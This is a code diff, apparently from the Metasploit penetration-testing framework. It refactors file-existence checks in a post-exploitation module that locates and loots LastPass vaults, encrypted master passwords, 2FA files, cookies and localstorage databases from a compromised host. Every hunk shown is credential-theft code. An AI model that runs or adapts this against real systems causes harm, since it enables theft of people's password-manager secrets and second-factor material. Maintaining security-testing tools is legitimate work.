@@ -135,8 +135,8 @@ class Metasploit3 < Msf::Post
         db_paths = find_db_paths(path, browser, account)
         if db_paths && db_paths.size > 0
           account_map[account][browser]['lp_db_path'] = db_paths.first
-          account_map[account][browser]['localstorage_db'] = localstorage_path_map[browser] if file_exists?(localstorage_path_map[browser]) || browser.match(/Firefox|IE/)
-          account_map[account][browser]['cookies_db'] = cookies_path_map[browser] if file_exists?(cookies_path_map[browser]) || browser.match(/Firefox|IE/)
+          account_map[account][browser]['localstorage_db'] = localstorage_path_map[browser] if file?(localstorage_path_map[browser]) || browser.match(/Firefox|IE/)
+          account_map[account][browser]['cookies_db'] = cookies_path_map[browser] if file?(cookies_path_map[browser]) || browser.match(/Firefox|IE/)
           account_map[account][browser]['cookies_db'] = account_map[account][browser]['lp_db_path'].first.gsub("prefs.js", "cookies.sqlite") if (!account_map[account][browser]['lp_db_path'].blank? && browser == 'Firefox')
         else
           account_map[account].delete(browser)
@@ -257,7 +257,7 @@ class Metasploit3 < Msf::Post
 
       # Extract master passwords
       path = localstorage_db_path + system_separator + "lp.loginpws"
-      data = read_remote_file(path) if file_exists?(path) # Read file if it exists
+      data = read_remote_file(path) if file?(path) # Read file if it exists
     end
 
     # Get encrypted master passwords
@@ -347,7 +347,7 @@ class Metasploit3 < Msf::Post
       browser_map.each_pair do |browser, lp_data|
         if browser.match(/Firefox|IE/)
           path = lp_data['localstorage_db'] + system_separator + "lp.suid"
-          data = read_remote_file(path) if file_exists?(path) # Read file if it exists
+          data = read_remote_file(path) if file?(path) # Read file if it exists
           data = windows_unprotect(data) if data != nil && data.size > 32 # Verify Windows protection
           loot_path = loot_file(nil, data, "#{browser.downcase}.lastpass.localstorage", "application/x-sqlite3", "#{account}'s #{browser} LastPass localstorage #{lp_data['localstorage_db']}")
           account_map[account][browser]['lp_2fa'] = data
@@ -401,14 +401,14 @@ class Metasploit3 < Msf::Post
               iterations_path = lp_data['localstorage_db'] + system_separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_key_ie.itr"
               vault_path = lp_data['localstorage_db'] + system_separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_lps.sxml"
             end
-            iterations = read_remote_file(iterations_path) if file_exists?(iterations_path) # Read file if it exists
+            iterations = read_remote_file(iterations_path) if file?(iterations_path) # Read file if it exists
             iterations = nil if iterations.blank? # Verify content
             lp_data['lp_creds'][username]['iterations'] = iterations
 
             # Find encrypted vault
             vault = read_remote_file(vault_path)
             vault = windows_unprotect(vault) if vault != nil && vault.match(/^AQAAA.+/) # Verify Windows protection
-            vault = vault.sub(/iterations=.*;/, "") if file_exists?(vault_path) # Remove iterations info
+            vault = vault.sub(/iterations=.*;/, "") if file?(vault_path) # Remove iterations info
             loot_path = loot_file(nil, vault, "#{browser.downcase}.lastpass.vault", "text/plain", "#{account}'s #{browser} LastPass vault")
             lp_data['lp_creds'][username]['vault_loot'] = loot_path
 
@@ -549,7 +549,7 @@ class Metasploit3 < Msf::Post
       else # IE
         path = lp_data['localstorage_db'] + system_separator + OpenSSL::Digest::SHA256.hexdigest(username) + ".sotp"
       end
-      otpbin = read_remote_file(path) if file_exists?(path) # Read file if it exists
+      otpbin = read_remote_file(path) if file?(path) # Read file if it exists
       otpbin = windows_unprotect(otpbin) if otpbin != nil && otpbin.match(/^AQAAA.+/)
       return otpbin
     else # Chrome, Safari and Opera
@@ -790,18 +790,6 @@ class Metasploit3 < Msf::Post
   # Returns OS separator in a session type agnostic way
   def system_separator
     return session.platform =~ /win/ ? '\\' : '/'
-  end
-
-  # Returns if file exists in a session type agnostic way
-  def file_exists?(path)
-    if session.type == "meterpreter"
-      return client.fs.file.exists?(path)
-    elsif session.type == "shell"
-      return session.shell_command("ls \"#{path}\"").strip == path.strip
-    else
-      print_error "Session type not recognized: #{session.type}"
-      return nil
-    end
   end
 
   # Return directory content in a session type agnostic way
